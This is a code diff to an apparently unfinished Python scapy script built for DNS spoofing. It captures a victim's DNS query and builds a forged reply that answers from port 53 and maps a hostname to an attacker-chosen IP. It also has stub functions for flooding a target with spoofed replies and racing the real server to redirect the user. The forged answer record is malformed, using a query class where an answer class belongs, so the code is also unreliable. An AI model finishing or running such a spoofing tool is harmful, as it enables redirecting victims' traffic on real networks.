@@ -20,29 +20,25 @@ def sniff_dns(sniff_time):
 	print "TIME IS UP"
 #packet breakdown
 def attack(packet):
-	ip_info=packet[IP]
-	dns_info=packet[DNS]
-	
-	#Get IP info
-	dns_server = ip_info.dst
-	victim = ip_info.src 
+	''' Debug stuff
+	print "****IP****"
+	print packet[IP].src
+	print packet[IP].dst
 
-	#Get DNS info
-	print "---------DNS STUFF----------"
-	print dns_info.qd.qname
-	#print dns_info.an 
-	#print dns_info.ns 
-	#print dns_info.ar 
+	print "****UDP****"
+	print packet[UDP].sport
+	print packet[UDP].dport
+
+	print "****DNS****"
+	print packet[DNS].qd
+	'''
+	DNSResp=IP(dst=packet[IP].src, src=packet[IP].dst)/UDP(sport=53, dport=packet[UDP].sport)/DNS(qr=1, rd=1, ra=1, qdcount=1, ancount=1, qd=DNSQR(qname="www.blah.com", qtype="A", qclass="IN"), an=DNSQR(rrname="www.blah.com", type="A", rclass="IN",ttl=3599, rdata="1.1.1.1" ))
 
 #spam client with DNS replies
 def spam_replies(evil_ip, target):
 	print "About to spam " + target + " with IP: " + evil_ip
 
 	#spam_response = IP(dst=target)\UDP(dport=53)
-
-#sit and wait for DNS requests and try to reply first
-def surgical_strike():
-	print "filler"
 
 def main():
 	#Args -e <IP of site to redirect user>, -d <DNS Server if known>
